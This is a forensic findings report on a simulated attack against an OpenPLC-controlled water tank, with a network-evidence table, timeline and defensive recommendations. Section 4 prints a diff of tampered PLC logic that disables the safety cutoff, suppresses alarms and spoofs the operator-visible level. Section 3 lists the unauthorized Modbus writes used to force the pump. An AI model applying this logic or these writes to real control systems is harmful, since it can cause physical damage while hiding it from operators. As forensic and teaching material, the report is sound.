# Forensic Findings — ICS Water-Tank Incident


## 1. Executive summary

A digital-forensics investigation was carried out on a simulated Industrial Control System (ICS) consisting of an OpenPLC v3 soft-PLC controlling a water tank, an HMI/historian, and an isolated network. The investigation reconstructed a three-stage attack:

1. **Reconnaissance** — the adversary scanned the control subnet and enumerated the PLC's Modbus coils and registers.
2. **Process manipulation** — the adversary issued unauthorized Modbus write commands (force pump, raise setpoint) from a non-HMI host.
3. **Logic tampering (Stuxnet-style)** — the adversary logged into the OpenPLC web interface with default credentials and uploaded a tampered control program that disabled the safety cut-off and spoofed the level reported to the operator while the tank silently overflowed.

The network capture contains **5 unauthorized Modbus write operations** from a non-HMI source and **4 program upload transactions**. The acquired PLC database shows the tampered program stored under an innocuous name (*Maintenance update v1.2*, uploaded 2026-11-11T13:24:47Z).

## 2. Live-acquisition snapshot (ground truth)

At acquisition time the hidden true-level register (%MW10 / HR1034) and the operator-visible register (%QW0 / HR0) were read directly from the live PLC:

| Point | Value |
|---|---|
| `level_hmi` | 533 |
| `true_level` | 1000 |
| `sp_high` | 2000 |
| `manual` | 1 |
| `pump` | 1 |
| `alarm` | 0 |
| `overflow` | 0 |

**The operator-visible level differs from the true level by 467 units** — direct evidence of sensor-value spoofing.

## 3. Network evidence

- Unauthorized Modbus writes (not from the HMI): **5**
- OpenPLC web logins observed: **134**
- Program upload transactions: **4**

See `evidence/analysis/network_summary.md` for the full list and the exact Wireshark display filters.

Representative unauthorized writes:

| UTC time | src | function | address (IEC) | value |
|---|---|---|---|---|
| 2026-11-11T13:21:52.573Z | 172.28.0.66 | 5 WriteSingleCoil | 0 (%QX0.0) |  |
| 2026-11-11T13:21:53.574Z | 172.28.0.66 | 6 WriteSingleRegister | 1024 (%MW0) | 2000 |
| 2026-11-11T13:21:54.574Z | 172.28.0.66 | 16 WriteMultipleRegisters | 1026 (%MW2) | 1 |
| 2026-11-11T13:24:59.800Z | 172.28.0.66 | 16 WriteMultipleRegisters | 1026 (%MW2) | 1 |
| 2026-11-11T13:24:59.801Z | 172.28.0.66 | 6 WriteSingleRegister | 1024 (%MW0) | 2000 |

## 4. PLC logic-tampering evidence

The uploaded program is byte-for-byte identical to the legitimate one except for the safety/reporting logic. Unified diff (legitimate → malicious):

```diff
--- water_tank_legit.st
+++ water_tank_malicious.st
@@ -1,28 +1,22 @@
 (*
   =====================================================================
-   water_tank_legit.st   --  LEGITIMATE water-tank control
+   water_tank_malicious.st  --  TAMPERED (Stuxnet-style) control logic
    IEC 61131-3 Structured Text, OpenPLC Runtime v3
   =====================================================================
-   Simulated process (physics runs inside the PLC scan cycle):
-     - Tank level 0..1000 (integer units).
-     - Pump adds water (inflow) when ON; drain valve removes water (outflow).
-     - Pump hysteresis: starts below LOW setpoint, stops above HIGH setpoint.
-     - HIGH setpoint is configurable over Modbus (holding register %MW0).
-     - Critical-level SAFETY cutoff forces the pump OFF above 950.
-     - Alarm bit set above the critical level; overflow bit latched at 1000.
+   Uploaded by the attacker under an innocent name ("Maintenance update").
+   It is byte-for-byte identical to water_tank_legit.st EXCEPT for four
+   lines (see markers >>> TAMPER <<<):
 
-   Register / coil map (verified against OpenPLC_v3 core/modbus.cpp):
-     Coils  (FC1 read / FC5,15 write):
-       %QX0.0 coil0  Pump running
-       %QX0.1 coil1  Drain valve open
-       %QX0.2 coil2  HIGH-level alarm (shown to HMI)
-       %QX0.3 coil3  Overflow latched (shown to HMI)
-     Holding registers (FC3 read / FC6,16 write):
-       %QW0  HR0     Level reported to the HMI
-       %MW0  HR1024  HIGH setpoint (pump stop)      [operator/engineer writes]
-       %MW1  HR1025  LOW setpoint  (pump start)     [operator/engineer writes]
-       %MW2  HR1026  Manual pump command 0/1        [operator/engineer writes]
-       %MW10 HR1034  TRUE tank level (ground truth) [PLC writes]
+     1. The critical-level SAFETY cutoff is DISABLED  -> the pump keeps
+        running even above 950, so the tank overflows.
+     2. The overflow latch reported to the HMI is forced FALSE.
+     3. The HIGH-level ALARM reported to the HMI is forced FALSE.
+     4. The level reported to the HMI (%QW0) is SPOOFED with a plausible
+        oscillation, while the TRUE level is still kept in %MW10.
+
+   Result: the operator's HMI shows a calm, normal-looking tank with no
+   alarm, while the real tank silently overflows. Same register/coil map
+   as the legitimate program.
   =====================================================================
 *)
 
@@ -52,8 +46,8 @@
     Initialized : BOOL := FALSE;
     PumpCmd     : BOOL := FALSE;
     Tick        : TON;              (* 1-second physics tick *)
-    SpoofPhase  : INT  := 0;        (* used only by the tampered program *)
-    SpoofDir    : INT  := 1;        (* kept here so both programs share layout *)
+    SpoofPhase  : INT  := 0;        (* drives the spoofed HMI value *)
+    SpoofDir    : INT  := 1;
   END_VAR
 
   (* ----- one-time initialisation ----- *)
@@ -71,20 +65,19 @@
   (* manual override forces the pump ON *)
   IF ManualPump >= 1 THEN PumpCmd := TRUE; END_IF;
 
-  (* >>> SAFETY (critical-level cutoff): forces the pump OFF above 950 <<< *)
-  IF TrueLevel >= 950 THEN PumpCmd := FALSE; END_IF;
+  (* >>> TAMPER 1: SAFETY critical-level cutoff DISABLED (line removed) <<< *)
+  (* IF TrueLevel >= 950 THEN PumpCmd := FALSE; END_IF; *)
 
   Pump  := PumpCmd;
   Drain := TRUE;                    (* drain continuously open -> steady outflow *)
 
-  (* overflow latch (true state reported to the HMI) *)
-  IF TrueLevel >= 1000 THEN Overflow := TRUE; END_IF;
+  (* >>> TAMPER 2: overflow latch hidden from the HMI (forced FALSE) <<< *)
+  Overflow := FALSE;
 
-  (* >>> REPORTING: tell the HMI the TRUTH <<< *)
-  Alarm    := (TrueLevel >= 950);
-  LevelHMI := TrueLevel;
+  (* >>> TAMPER 3 + 4: suppress the alarm and SPOOF the HMI level <<< *)
+  Alarm    := FALSE;
+  LevelHMI := 470 + SpoofPhase;     (* plausible 470..650 oscillation *)
 
-  (* spoof phase is advanced in both programs (unused here) *)
   (* ===== PHYSICS : actuate -> integrate (~once per second) ===== *)
   Tick(IN := NOT Tick.Q, PT := T#1000ms);
   IF Tick.Q THEN
@@ -93,7 +86,7 @@
     IF TrueLevel < 0    THEN TrueLevel := 0;    END_IF;
     IF TrueLevel > 1000 THEN TrueLevel := 1000; END_IF;
 
-    (* advance the plausible-looking spoof oscillation (dead code in legit) *)
+    (* advance the plausible-looking spoof oscillation *)
     SpoofPhase := SpoofPhase + (SpoofDir * 7);
     IF SpoofPhase >= 180 THEN SpoofDir := -1; END_IF;
     IF SpoofPhase <= 0   THEN SpoofDir :=  1; END_IF;
```

See `evidence/analysis/plc_summary.md` and `program_diff_onplc.txt`.

## 5. Unified incident timeline

A merged, UTC-sorted timeline of **192 events** across all sources is in `evidence/analysis/timeline.md` / `timeline.csv`. Key milestones:

- `2018-05-24T18:02:33.000Z` **openplc_db/program_upload** — program 'Blank Program' (blank_program.st) uploaded
- `2018-05-24T18:02:33.000Z` **openplc_db/program_upload** — program 'webserver_program' (webserver_program.st) uploaded
- `2026-11-11T13:17:54.090Z` **operator_log/milestone** — SETUP: build images
- `2026-11-11T13:17:55.570Z` **operator_log/milestone** — SETUP: start the lab stack (plc, hmi, attacker, sniffer)
- `2026-11-11T13:18:01.000Z` **openplc_db/program_upload** — program 'Water Tank Control v1.0' (321447.st) uploaded
- `2026-11-11T13:18:01.671Z` **operator_log/milestone** — SETUP: wait for the OpenPLC runtime to become healthy
- `2026-11-11T13:18:01.696Z` **operator_log/milestone** — SETUP: configure OpenPLC (login, upload legit program, compile, start)
- `2026-11-11T13:18:01.785Z` **pcap/http_program-upload** — POST /upload-program from 172.28.0.1
- `2026-11-11T13:18:07.782Z` **operator_log/milestone** — SETUP: verify Modbus is answering with sensible values
- `2026-11-11T13:18:14.087Z` **pcap/recon_scan** — scan from 172.28.0.66: 256 hosts, 508 SYNs
- `2026-11-11T13:18:14.210Z` **operator_log/milestone** — SETUP COMPLETE
- `2026-11-11T13:20:50.309Z` **operator_log/milestone** — ATTACK CAMPAIGN START
- `2026-11-11T13:20:50.318Z` **operator_log/milestone** — ATTACK PHASE 1 / 3 : RECONNAISSANCE
- `2026-11-11T13:21:52.282Z` **operator_log/milestone** — ATTACK PHASE 2 / 3 : PROCESS MANIPULATION (unauthorized Modbus writes)
- `2026-11-11T13:24:45.653Z` **operator_log/milestone** — ATTACK PHASE 3 / 3 : LOGIC TAMPERING (malicious program upload)
- `2026-11-11T13:24:46.710Z` **pcap/http_program-upload** — POST /upload-program from 172.28.0.66
- `2026-11-11T13:24:47.000Z` **openplc_db/program_upload** — program 'Maintenance update v1.2' (882164.st) uploaded
- `2026-11-11T13:24:53.115Z` **historian/spoofing_detected** — HMI/true level divergence >=150 (hmi=477, true=279) — level spoofing
- `2026-11-11T13:27:59.867Z` **operator_log/milestone** — ATTACK CAMPAIGN COMPLETE
- `2026-11-11T13:28:50.504Z` **operator_log/milestone** — ACQUIRE 1/8: LIVE PLC STATE (most volatile first)
- `2026-11-11T13:28:50.781Z` **operator_log/milestone** — ACQUIRE 2/8: FINALIZE PACKET CAPTURE
- `2026-11-11T13:28:50.994Z` **operator_log/milestone** — ACQUIRE 3/8: CONTAINER FORENSICS (diff / logs / inspect)
- `2026-11-11T13:28:54.712Z` **operator_log/milestone** — ACQUIRE 4/8: COPY OPENPLC DB, .st FILES, COMPILED PROGRAM
- `2026-11-11T13:28:54.999Z` **operator_log/milestone** — ACQUIRE 5/8: DOCKER EXPORT PLC FILESYSTEM (tar)
- `2026-11-11T13:29:22.539Z` **operator_log/milestone** — ACQUIRE 6/8: COPY HMI HISTORIAN
- `2026-11-11T13:29:22.562Z` **operator_log/milestone** — ACQUIRE 7/8: SHA-256 + CHAIN OF CUSTODY
- `2026-11-11T13:29:35.449Z` **operator_log/milestone** — ACQUIRE 8/8: MAKE EVIDENCE READ-ONLY
- `2026-11-11T13:29:35.528Z` **operator_log/milestone** — ACQUISITION COMPLETE

## 6. Figures

- `evidence/analysis/figures/operator_view_vs_reality.png` — HMI level vs. true level (the deception).
- `evidence/analysis/figures/operator_digital_signals.png` — pump / alarm / overflow as seen by the operator.
- `evidence/analysis/figures/timeline.png` — incident timeline.

## 7. Evidence integrity & chain of custody

- Acquired artifacts recorded in the chain of custody: **27**
- Every artifact is SHA-256 hashed (`evidence/acquisition/hashes.sha256`) and the acquisition set was made read-only after hashing.
- Full custody record: `evidence/acquisition/chain_of_custody.csv`.

## 8. Conclusions & recommendations

- Modbus/TCP provides **no authentication or integrity**; any host on the control network can read and write process variables. Segment the control network and restrict write access.
- The OpenPLC web interface used **default credentials**; enforce strong credentials and restrict management-plane access.
- Safety logic running on the same PLC can be overwritten; use independent, hard-wired safety instrumented systems (SIS).
- Operators relied solely on PLC-reported values; add out-of-band / independent instrumentation and anomaly detection (e.g. pump energized while level appears steady).

*See docs/LIMITATIONS.md for the limitations of this simulated lab versus a real ICS.*
